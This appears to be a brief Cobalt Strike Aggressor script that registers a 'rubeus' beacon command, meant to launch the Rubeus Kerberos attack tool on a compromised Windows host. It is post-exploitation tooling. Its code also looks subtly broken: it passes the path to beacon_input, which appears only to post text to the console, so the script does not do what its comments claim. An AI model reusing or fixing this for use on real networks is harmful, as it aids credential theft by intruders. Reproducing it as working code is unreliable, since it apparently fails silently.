alias rubeus {
    # Construct the command to execute Rubeus
    local('$command');
    $command = "C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe";

    # Execute the command in the beacon
    beacon_input($1, $command);
}

# Register a custom command
beacon_command_register("rubeus", "Execute Rubeus", "Runs Rubeus.exe from the specified path.");
